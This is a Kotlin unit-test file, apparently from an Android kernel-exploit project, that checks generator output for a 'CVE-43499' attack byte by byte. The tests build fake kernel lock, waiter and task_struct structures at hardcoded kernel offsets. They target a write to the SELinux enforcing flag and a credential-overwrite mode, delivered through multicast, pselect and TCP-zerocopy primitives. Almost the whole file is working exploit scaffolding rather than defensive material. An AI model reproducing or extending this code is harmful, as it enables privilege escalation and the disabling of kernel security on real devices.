package com.ghostlock.app.backend.backends.cve43499.generator

import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499PlacementFacts
import com.ghostlock.app.backend.backends.cve43499.config.Cve43499DebugConfig
import com.ghostlock.app.backend.backends.cve43499.config.DebugInjection
import com.ghostlock.app.backend.backends.cve43499.config.DebugPrimitiveKind
import com.ghostlock.app.jni.Native43499MulticastSpec
import com.ghostlock.app.jni.Native43499PselectSpec
import com.ghostlock.app.jni.Native43499TcpZerocopySpec
import java.io.File
import java.security.MessageDigest
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test

/**
 * R3b 三路 generator 字节向量对拍（与 legacy/legacy2 常量逐字节）。
 *
 * @note 期望值全部用手写 legacy 常量（0xe80/0x1180/0x1280/0x1240/0x1260/0x100/
 *   16/264/144/152/320/0x40/0x20/0x18/0x28/0x30/0x33/0x55…）独立构造，不复用
 *   generator 内部逻辑；任何配置/布局/偏移回归都会让整段 [ByteArray] 不等。
 * @note 纯 JVM 单测；不触 Native、不触 Android。
 */
class Cve43499GeneratorVectorTest {
    private val debug = Cve43499DebugConfig.parse(readDebugAsset())
    private val execution = Cve43499DebugConfig.executionParameters()

    /* ---------- legacy 目标常量（独立字面量，非配置读取） ---------- */

    private val directMapBase = 0xffffff8000000000uL.toLong()
    private val initTaskAlias = alias(0x02c43400L)
    private val rootTaskGroupAlias = alias(0x02d58ac0L)
    private val writeTarget = alias(0x02daad88L)
    private val base = 0xffffff8800210000uL.toLong()
    private val facts = Cve43499PlacementFacts(
        candidatePageBase = base,
        pageSize = 0x1000L,
        allocationSize = 0x8000L,
        requiredAlignment = 0x8000L,
        measuredObjectAddress = 0xffffff8800211234uL.toLong(),
        measurementRounds = 3L,
        retainedChildCount = 0L,
        retainedDescriptorCount = 0L,
    )

    @Test
    fun `multicast generator matches legacy stamp and 64 KiB payload bytes`() {
        val context = Cve43499GeneratorContext(debug, execution, GHOST_PID)
        val generated = Cve43499MulticastInputGenerator(context).generate(facts)
        val spec = generated.primitive as Native43499MulticastSpec

        val payloadBase = base - 0xe80L
        val fakeLock = payloadBase + 0xe80L
        val fakeW0 = payloadBase + 0x1180L
        val fakeTask = payloadBase + 0x1280L
        val writeValue = base + 0x100L
        val parent = writeTarget - 8L

        assertEquals("legacy2 布局：fake_lock==base", base, fakeLock)
        assertEquals("legacy2 布局：fake_task==base+0x400", base + 0x400L, fakeTask)

        /* 1) stamp：264B，family@8=AF_UNSPEC，task@144，lock@152。 */
        val expectedStamp = ByteArray(264)
        Expected(expectedStamp).apply {
            u64(96L + 48L, fakeTask)
            u64(96L + 56L, fakeLock)
            u16(8L, 0)
        }
        assertTrue("stamp 逐字节不一致", expectedStamp.contentEquals(spec.frameBytes))
        assertEquals(264, spec.frameBytes.size)
        assertEquals(fakeTask, spec.finalTaskAddress)
        assertEquals(fakeLock, spec.finalLockAddress)
        assertEquals(fakeW0, spec.finalWaiterAddress)

        /* 2) landing：64 KiB，两个 32 KiB chunk 内容相同（legacy prepare_skb_payload）。 */
        val expectedLanding = ByteArray(0x10000)
        val writer = Expected(expectedLanding)
        for (chunk in listOf(0L, 0x8000L)) {
            val at = chunk /* skb_frag_bias=0 */
            writer.u32(at + 0x0e80L, 0L)
            writer.u64(at + 0x0e88L, fakeW0)
            writer.u64(at + 0x0e90L, fakeW0)
            writer.u64(at + 0x0e98L, fakeTask or 1L)
            /* compact waiter（tree_entry）：0x18=value,0x20=0,0x28=target。 */
            writer.u64(at + 0x1180L, 1L)
            writer.u64(at + 0x1188L, 0L)
            writer.u64(at + 0x1190L, 0L)
            writer.u64(at + 0x1198L, writeValue)
            writer.u64(at + 0x11a0L, 0L)
            writer.u64(at + 0x11a8L, writeTarget)
            writer.u64(at + 0x11b0L, initTaskAlias)
            writer.u64(at + 0x11b8L, fakeLock)
            writer.u32(at + 0x11c0L, 0L)
            writer.u32(at + 0x11c4L, 140L)
            writer.u64(at + 0x11c8L, 0L)
            writer.u64(at + 0x11d0L, 0L)
            /* 假 task（compact 用 profile task_struct 偏移）。 */
            writer.u32(at + 0x1280L + 0x40L, 0x100L)
            writer.u32(at + 0x1280L + 124L, 120L)
            writer.u32(at + 0x1280L + 132L, 120L)
            writer.u32(at + 0x1280L + 2180L, 0L)
            writer.u64(at + 0x1280L + 2200L, 0L)
            writer.u64(at + 0x1280L + 2208L, 0L)
            writer.u64(at + 0x1280L + 1024L, rootTaskGroupAlias)
            writer.u64(at + 0x1280L + 2216L, initTaskAlias)
            writer.u64(at + 0x1280L + 2224L, 0L)
            /* rb 右/左节点：parent/0/0。 */
            writer.u64(at + 0x1240L, parent)
            writer.u64(at + 0x1248L, 0L)
            writer.u64(at + 0x1250L, 0L)
            writer.u64(at + 0x1260L, parent)
            writer.u64(at + 0x1268L, 0L)
            writer.u64(at + 0x1270L, 0L)
        }
        assertTrue("landing 逐字节不一致", expectedLanding.contentEquals(generated.landing.finalBytes))
        assertEquals(0x10000, generated.landing.finalBytes.size)
        assertEquals(0x10000L, generated.landing.reclaimPayloadSize)
        assertEquals(base, fakeLock)

        /* 3) 页接受参数由 layout 派生：required=1/offset=0x100/bit=16。 */
        assertEquals(1L, generated.landing.pageAcceptRequired)
        assertEquals(0x100L, generated.landing.pageAcceptOffset)
        assertEquals(16L, generated.landing.pageAcceptBit)
        assertTrue(
            layoutAcceptsPage(
                request = context.writeRequest(),
                layout = writeLayout(context.writeRequest(), base, debug.generator.payload, 8L),
                pageAcceptBit = 16L,
            ),
        )

        /* 4) spec 执行参数（legacy route_multicast.cpp:101-131 + profile）。 */
        assertEquals(1L shl 20, spec.socketBufferSize)
        assertEquals(128L, spec.operationBudget)
        assertEquals(1_000_000_000L, spec.timeoutNanos)
        assertEquals(2, spec.addressFamily)
        assertEquals(20_000L, spec.armHoldNs)
        assertEquals(16L, spec.armSequence)
        assertEquals(264L, spec.maxFrame)
        assertEquals(GHOST_PID, spec.ghostPid)
        assertEquals(0x80000000L, spec.futexWaiterFlag)
        assertEquals(1, spec.disarmRequired)
        assertEquals(0x41L, generated.landing.fillByte)
    }

    @Test
    fun `mondrian legacy2 host byte diff payload and stamp`() {
        val mondrian = Cve43499DebugConfig.parse(readMondrianAsset())
        val mondrianExecution = Cve43499DebugConfig.executionParameters(mondrian)
        val context = Cve43499GeneratorContext(mondrian, mondrianExecution, GHOST_PID)
        val generated = Cve43499MulticastInputGenerator(context).generate(facts)
        val spec = generated.primitive as Native43499MulticastSpec
        val payload = generated.landing.finalBytes
        val stamp = spec.frameBytes
        val payloadSha = sha256(payload)
        val stampSha = sha256(stamp)
        File("/tmp/kotlin_legacy2_payload.bin").writeBytes(payload)
        File("/tmp/kotlin_legacy2_stamp.bin").writeBytes(stamp)
        println("KOTLIN_LEGACY2_PAYLOAD_SHA=" + payloadSha)
        println("KOTLIN_LEGACY2_STAMP_SHA=" + stampSha)
        println("KOTLIN_LEGACY2_PAYLOAD_HEAD=" + payload.take(64).joinToString("") { "%02x".format(it) })
        println("KOTLIN_LEGACY2_STAMP_HEX=" + stamp.joinToString("") { "%02x".format(it) })
        /* legacy2 host 真函数输出（app/src/main/cpp/backends/43499/legacy2/core/tests/host/payload_full_vectors.cpp，2026-10-28）：
         * payload sha256=94d5...? / stamp sha256=6eae...
         * 本向量输入：base=0xffffff8800210000、target=alias(off_selinux_enforcing=41846440)、
         * init_task=40542656、root_task_group=41507584、task_struct=mondrian、W1 zero+preserve_child。
         * host 源码：legacy2/core/support.cpp:417-475 prepare_skb_payload；
         * legacy2/core/memory.cpp:176-224 payload_write_layout；payload_encode.h:55-69 stamp。 */
        assertEquals(
            "legacy2 host payload sha256 不一致（首差异见下）",
            "a2000ce9f866e5ccd9180b8d06ea4f7e4b398f913800d3b593a016ea3c061c9e",
            payloadSha,
        )
        assertEquals(
            "legacy2 host stamp sha256 不一致",
            "6eaee005060f5f7462140ac868c9d5b0db011bb6472e60b7fdbcb93616875034",
            stampSha,
        )
        println("FIRST_DIFF=none")
    }

    private fun sha256(bytes: ByteArray): String =
        MessageDigest.getInstance("SHA-256").digest(bytes)
            .joinToString("") { "%02x".format(it) }

    private fun readMondrianAsset(): String {
        val candidates = listOf(
            File("src/debug/assets/profile/43499/debug-mondrian.conf"),
            File("../src/debug/assets/profile/43499/debug-mondrian.conf"),
            File("app/src/debug/assets/profile/43499/debug-mondrian.conf"),
        )
        return candidates.firstOrNull { it.isFile }?.readText()
            ?: error("mondrian debug asset not found from ${File(".").absolutePath}")
    }

    @Test
    fun `multicast page accept rejects even initialized bit from facts`() {
        val context = Cve43499GeneratorContext(debug, execution, GHOST_PID)
        val evenBase = 0xffffff8800200000uL.toLong() /* bit16 == 0 */
        val request = context.writeRequest()
        val layout = writeLayout(request, evenBase, debug.generator.payload, 8L)
        assertFalse(layoutAcceptsPage(request, layout, 16L))
        /* generator 仍按 layout 输出判据参数；Native 在提交点前拒绝该页（R3a-2/B6）。 */
        val generated = Cve43499MulticastInputGenerator(context).generate(
            facts.copy(candidatePageBase = evenBase),
        )
        assertEquals(1L, generated.landing.pageAcceptRequired)
        assertEquals(0x100L, generated.landing.pageAcceptOffset)
        assertEquals(16L, generated.landing.pageAcceptBit)
    }

    @Test
    fun `pselect generator matches legacy fd_set words`() {
        val pselectDebug = debug.copy(injection = DebugInjection(DebugPrimitiveKind.PSELECT))
        val context = Cve43499GeneratorContext(pselectDebug, execution, GHOST_PID)
        val generated = Cve43499PselectInputGenerator(context).generate(facts)
        val spec = generated.primitive as Native43499PselectSpec

        val payloadBase = base - 0xe80L
        val fakeLock = payloadBase + 0xe80L
        val fakeW0 = payloadBase + 0x1180L
        val fakeTask = payloadBase + 0x1280L
        val writeValue = base + 0x100L

        /* nfds=320 ⇒ 每 set 5 字；shift=-2 ⇒ 词表 global_word 0..10。 */
        val expected = ByteArray(120)
        Expected(expected).apply {
            u64(0L, writeValue) /* word 2 tree_pc → in[0] */
            u64(8L, 0L) /* word 3 → in[1] */
            u64(16L, writeTarget) /* word 4 tree_left → in[2] */
            u64(24L, writeValue) /* word 5 pi_pc → in[3] */
            u64(32L, 0L) /* word 6 → in[4] */
            u64(40L, writeTarget) /* word 7 pi_left → out[0] */
            u64(48L, fakeTask) /* word 8 task → out[1] */
            u64(56L, fakeLock) /* word 9 lock → out[2] */
            u64(64L, (140L shl 32) or 3L) /* word 10 wake_prio → out[3] */
            u64(72L, 0L) /* word 11 → out[4] */
            u64(80L, 0L) /* word 12 → ex[0] */
        }
        assertTrue("fd_set 词表逐字节不一致", expected.contentEquals(spec.frameBytes))
        assertEquals(120, spec.frameBytes.size)
        assertEquals(320L, spec.descriptorCapacity)
        assertEquals(320L, spec.maxNfds)
        assertEquals(4L, spec.operationBudget)
        assertEquals(800_000_000L, spec.timeoutNanos)
        assertEquals(0L, spec.perAttemptDelayNs)
        assertEquals(50_000_000L, spec.enterDelayNs)
        assertEquals(64L, spec.fdReserveStride)
        assertEquals(0L, spec.selectUseTimeval)
        assertEquals(fakeTask, spec.finalTaskAddress)
        assertEquals(fakeLock, spec.finalLockAddress)
        assertEquals(fakeW0, spec.finalWaiterAddress)
        assertEquals(1L, generated.landing.pageAcceptRequired)
        assertEquals(0x100L, generated.landing.pageAcceptOffset)
        assertEquals(16L, generated.landing.pageAcceptBit)
    }

    @Test
    fun `tcp generator matches legacy zc frame and tcp payload layout`() {
        val tcpDebug = debug.copy(injection = DebugInjection(DebugPrimitiveKind.TCP_ZEROCOPY))
        val context = Cve43499GeneratorContext(tcpDebug, execution, GHOST_PID)
        val generated = Cve43499TcpZerocopyInputGenerator(context).generate(facts)
        val spec = generated.primitive as Native43499TcpZerocopySpec

        /* tcp 布局：payload_base=base（delta=0），chunk_bias=0xe80，fake_task@0x5800。 */
        val fakeLock = base + 0xe80L
        val fakeW0 = base + 0x1180L
        val fakeTask = base + 0x5800L
        assertEquals(fakeTask, base + 0x5800L)

        /* 1) 0x40 zc 帧：length@0x20=64，task@0x28=init_task alias，lock@0x30=fake_lock，
         *    address@0x18=0（Native 运行时写 own mmap 地址）。 */
        val expectedFrame = ByteArray(0x40)
        Expected(expectedFrame).apply {
            u32(0x20L, 64L)
            u64(0x28L, initTaskAlias)
            u64(0x30L, fakeLock)
        }
        assertTrue("zc 帧逐字节不一致", expectedFrame.contentEquals(spec.frameBytes))
        assertEquals(0x40, spec.frameBytes.size)
        assertEquals(0L, Expected(spec.frameBytes).getU64(0x18L))

        /* 2) landing：tcp 布局（每个 32KiB chunk 相对偏移 +0xe80）。 */
        val expectedLanding = ByteArray(0x10000)
        val writer = Expected(expectedLanding)
        for (chunk in listOf(0L, 0x8000L)) {
            val at = chunk + 0xe80L
            writer.u32(at + 0x0e80L, 0L)
            writer.u64(at + 0x0e88L, fakeW0)
            writer.u64(at + 0x0e90L, fakeW0)
            writer.u64(at + 0x0e98L, fakeTask or 1L)
            writer.u64(at + 0x1180L, 1L)
            writer.u64(at + 0x1188L, 0L)
            writer.u64(at + 0x1190L, 0L)
            writer.u64(at + 0x1198L, base + 0x100L)
            writer.u64(at + 0x11a0L, 0L)
            writer.u64(at + 0x11a8L, writeTarget)
            writer.u64(at + 0x11b0L, initTaskAlias)
            writer.u64(at + 0x11b8L, fakeLock)
            writer.u32(at + 0x11c0L, 0L)
            writer.u32(at + 0x11c4L, 140L)
            writer.u64(at + 0x11c8L, 0L)
            writer.u64(at + 0x11d0L, 0L)
            writer.u32(at + 0x5800L + 0x40L, 0x100L)
            writer.u32(at + 0x5800L + 124L, 120L)
            writer.u32(at + 0x5800L + 132L, 120L)
            writer.u32(at + 0x5800L + 2180L, 0L)
            writer.u64(at + 0x5800L + 2200L, 0L)
            writer.u64(at + 0x5800L + 2208L, 0L)
            writer.u64(at + 0x5800L + 1024L, rootTaskGroupAlias)
            writer.u64(at + 0x5800L + 2216L, initTaskAlias)
            writer.u64(at + 0x5800L + 2224L, 0L)
            writer.u64(at + 0x1240L, writeTarget - 8L)
            writer.u64(at + 0x1248L, 0L)
            writer.u64(at + 0x1250L, 0L)
            writer.u64(at + 0x1260L, writeTarget - 8L)
            writer.u64(at + 0x1268L, 0L)
            writer.u64(at + 0x1270L, 0L)
        }
        assertTrue("tcp landing 逐字节不一致", expectedLanding.contentEquals(generated.landing.finalBytes))

        /* 3) spec 参数（legacy route_tcp_session.cpp.disabled:52-64）。 */
        assertEquals(16L * 1024L * 1024L, spec.mappingSize)
        assertEquals(16L * 1024L * 1024L, spec.maxMapping)
        assertEquals(0x40L, spec.maxFrame)
        assertEquals(64L, spec.receiveSize)
        assertEquals(0x1000L, spec.mappingOffset)
        assertEquals(2000L, spec.operationBudget)
        assertEquals(1_000_000_000L, spec.timeoutNanos)
        assertEquals(10_000_000L, spec.punchSpin)
        assertEquals(10_000_000L, spec.punchPhaseSpin)
        assertEquals(20_000L, spec.postHoldNs)
        assertEquals(16L, spec.armSequence)
        assertEquals(0x18L, spec.zcAddressOffset)
        assertEquals(0x20L, spec.zcLengthOffset)
        assertEquals(0x28L, spec.zcTaskOffset)
        assertEquals(0x30L, spec.zcLockOffset)
        assertEquals(0x33L, spec.sendFillByte)
        assertEquals(0x55L, spec.mappingFillByte)
        assertEquals(initTaskAlias, spec.finalTaskAddress)
        assertEquals(fakeLock, spec.finalLockAddress)
        assertEquals(fakeW0, spec.finalWaiterAddress)
        assertEquals(1L, generated.landing.pageAcceptRequired)
        assertEquals(0x100L, generated.landing.pageAcceptOffset)
        assertEquals(16L, generated.landing.pageAcceptBit)
    }

    /* ---------- 负例：非法事实/配置必须具名拒绝 ---------- */

    @Test
    fun `generator refuses zero candidate page base`() {
        val context = Cve43499GeneratorContext(debug, execution, GHOST_PID)
        try {
            Cve43499MulticastInputGenerator(context).generate(facts.copy(candidatePageBase = 0L))
            fail("zero base must be rejected")
        } catch (problem: Cve43499GeneratorException) {
            assertTrue(problem.reason.startsWith("facts:"))
        }
    }

    @Test
    fun `generator refuses reclaim payload mismatch`() {
        val context = Cve43499GeneratorContext(debug, execution, GHOST_PID)
        try {
            Cve43499MulticastInputGenerator(context).generate(facts.copy(allocationSize = 0x4000L))
            fail("allocation mismatch must be rejected")
        } catch (problem: Cve43499GeneratorException) {
            assertEquals("facts:reclaim-payload-size-mismatch", problem.reason)
        }
    }

    @Test
    fun `pselect generator refuses nfds out of domain`() {
        val bad = debug.copy(
            injection = DebugInjection(DebugPrimitiveKind.PSELECT),
            generator = debug.generator.copy(
                pselect = debug.generator.pselect.copy(nfds = 0L),
            ),
        )
        val context = Cve43499GeneratorContext(bad, execution, GHOST_PID)
        try {
            Cve43499PselectInputGenerator(context).generate(facts)
            fail("bad nfds must be rejected")
        } catch (problem: Cve43499GeneratorException) {
            assertEquals("pselect:nfds", problem.reason)
        }
    }

    @Test
    fun `tcp generator refuses overlapping zc offsets`() {
        val bad = debug.copy(
            injection = DebugInjection(DebugPrimitiveKind.TCP_ZEROCOPY),
            generator = debug.generator.copy(
                tcp = debug.generator.tcp.copy(zcTaskOffset = 0x18L),
            ),
        )
        val context = Cve43499GeneratorContext(bad, execution, GHOST_PID)
        try {
            Cve43499TcpZerocopyInputGenerator(context).generate(facts)
            fail("overlapping zc offsets must be rejected")
        } catch (problem: Cve43499GeneratorException) {
            assertEquals("tcp:zc-offsets-overlap", problem.reason)
        }
    }

    @Test
    fun `credential write needs an explicit init cred alias`() {
        val context = Cve43499GeneratorContext(debug, execution, GHOST_PID)
        val request = context.writeRequest().copy(mode = Cve43499WriteMode.CREDENTIAL)
        try {
            writeLayout(request, base, debug.generator.payload, 8L)
            fail("credential mode without init_cred alias must be rejected")
        } catch (problem: Cve43499GeneratorException) {
            assertEquals("write-layout:credential-init-cred-alias-missing", problem.reason)
        }
    }

    /* ---------- 工具 ---------- */

    private fun alias(symbolOffset: Long): Long =
        directMapBase or (0x28000000L + symbolOffset) /* (phys_load - phys_offset) = 0x28000000 */

    private fun readDebugAsset(): String {
        val candidates = listOf(
            File("src/debug/assets/profile/43499/debug-a301so.conf"),
            File("../src/debug/assets/profile/43499/debug-a301so.conf"),
            File("app/src/debug/assets/profile/43499/debug-a301so.conf"),
        )
        return candidates.firstOrNull { it.isFile }?.readText()
            ?: error("debug asset not found from ${File(".").absolutePath}")
    }

    /** 独立的小端期望写器（只用于测试对拍；越界即测试失败）。 */
    private class Expected(private val bytes: ByteArray) {
        fun u16(offset: Long, value: Int) {
            check(offset >= 0 && offset + 2 <= bytes.size) { "u16 oob $offset" }
            bytes[offset.toInt()] = (value and 0xff).toByte()
            bytes[offset.toInt() + 1] = ((value ushr 8) and 0xff).toByte()
        }

        fun u32(offset: Long, value: Long) {
            check(offset >= 0 && offset + 4 <= bytes.size) { "u32 oob $offset" }
            for (index in 0 until 4) {
                bytes[offset.toInt() + index] = ((value ushr (8 * index)) and 0xffL).toByte()
            }
        }

        fun u64(offset: Long, value: Long) {
            check(offset >= 0 && offset + 8 <= bytes.size) { "u64 oob $offset" }
            for (index in 0 until 8) {
                bytes[offset.toInt() + index] = ((value ushr (8 * index)) and 0xffL).toByte()
            }
        }

        fun getU64(offset: Long): Long {
            check(offset >= 0 && offset + 8 <= bytes.size) { "u64 oob $offset" }
            var value = 0L
            for (index in 0 until 8) {
                value = value or
                    ((bytes[offset.toInt() + index].toLong() and 0xffL) shl (8 * index))
            }
            return value
        }
    }

    private companion object {
        /** 伪造的本进程 pid（generator 只校验 >0 并原样写入 spec）。 */
        private const val GHOST_PID = 4242
    }
}
